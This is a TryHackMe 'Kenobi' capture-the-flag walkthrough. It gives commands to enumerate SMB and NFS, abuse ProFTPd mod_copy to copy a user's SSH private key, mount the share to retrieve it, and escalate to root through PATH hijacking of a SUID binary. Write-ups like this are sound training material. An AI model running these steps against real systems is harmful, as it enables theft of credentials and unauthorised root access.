---
description: 'This is my walkthrough for the TryHackMe Room: Kenobi.'
---

# Kenobi

This room can be found [here](https://tryhackme.com/room/kenobi). This will be exploiting a linux machine, enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation.

I will be going through room using the attackbox

## Task 1

### Question #1: Scan the machine with nmap, how many ports are open?

`sudo nmap -sS -sV -vv -oA Kenobi 10.10.95.185`

Our results show us the answer:

![](<../../../.gitbook/assets/image (173).png>)

## Task 2

### Question #1: Using the nmap command above, how many shares have been found?

This asks us to run the nmap scan `nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.95.185` to find the shares.&#x20;

### Question #2: Once you're connected, list the files on the share. What is the file can you see?

We can connect to the machine via SMB with `smbclient //10.10.95.185/anonymous`.When prompted for a password, we can press enter to connect with no password.

Once we're connected we can run `ls` to see what files are there. We can download the file(s) with `smbget -R smb://10.10.95.185/anonymous`.  Again pressing enter when prompted for a password for a blank/empty password.

### Question #3: What port is FTP running on?

Refer back to our Nmap scan.

### Question #4: What mount can we see?

Running the nmap scan `nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.95.185` we can see the mount point.

## Task 3

### Question #1: What is the version?

Referring back to our Nmap scan result again we can find the ProFtpd version.

### Question #2: How many exploits are there for the ProFTPd running?

We can use [searchsploit](https://github.com/offensive-security/exploitdb) or [exploit-db](https://www.exploit-db.com/) to find the exploits. As the room states, we should have found exploit from ProFtpd's [mod\_copy module](http://www.proftpd.org/docs/contrib/mod\_copy.html). So now now we are going to copy Kenobi's private key using SITE CPFR and SITE CPTO commands.

First connect to the target via FTP with netcat with `nc 10.10.95.185 21`.

Then we `SITE CPFR /home/kenobi/.ssh/id_rsa`.

Finally `SITE CPTO /var/tmp/id_rsa`.

This does a "copy from" selecting the file name, and "copy to" selecting where you're copying the file to.

### Question #3: What is Kenobi's user flag (/home/kenobi/user.txt)?

Since we know the /var is a mount point, we can mount that to our machine and copy the files we need from there.

We can easily follow the rooms directions to create a mount point and mount the /var directory to the newly created mount point.

`mkdir /mnt/kenobiNFS`

`mount` 10.10.95.185`:/var /mnt/kenobiNFS`&#x20;

`ls -la /mnt/kenobiNFS`

Now that we have this mounted, we can go into the `tmp` directory to get the `id_rsa` file we copied to that directory. `cp /mnt/kenobiNFS/tmp/id_rda .` and then we change permissions on that file so we can use the file. `sudo chmod 600 id_rsa`. Finally we can now ssh into the machine and obtain the flag!

`ssh -i id_rsa kenobi@10.10.95.185` and after we have established a connection, `cat /home/kenobi/user.txt`.

## Task 4

We will be looking for SUID bits to able to manipulate so we can escalate to the root user.

As the room states, we can find SUID bits with `find / -perm -u=s -type f 2>/dev/null`.

### Question #1: What file looks particularly out of the ordinary?

Some of these might not jump out to new users right away, but the `/usr/bin/menu` file stands out a bit.

### Question #2: Run the binary, how many options appear?

What happens when we run the command `menu`?

![](<../../../.gitbook/assets/image (268).png>)

Strings is a command on Linux that looks for human readable strings on a binary. This shows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname). As this file runs as the root users privileges, we can manipulate our path gain a root shell.

So as the room states, we can:

`cd tmp && echo /bin/sh > curl`

`chmod 777 curl`

`export PATH=/tmp:$PATH`

`/usr/bin/menu`

So now if we type 1 for our status check we should be the root user.

This creates a file called `curl` with the contents `/bin/sh`, changed the permissions, and adds the `/tmp` directory to the path so when the "status check" is run from the `menu` command and it runs curl, it's actually running /bin/sh giving us root permissions.

### Question #3: What is the root flag (/root/root.txt)?

`cat /root/root.txt`
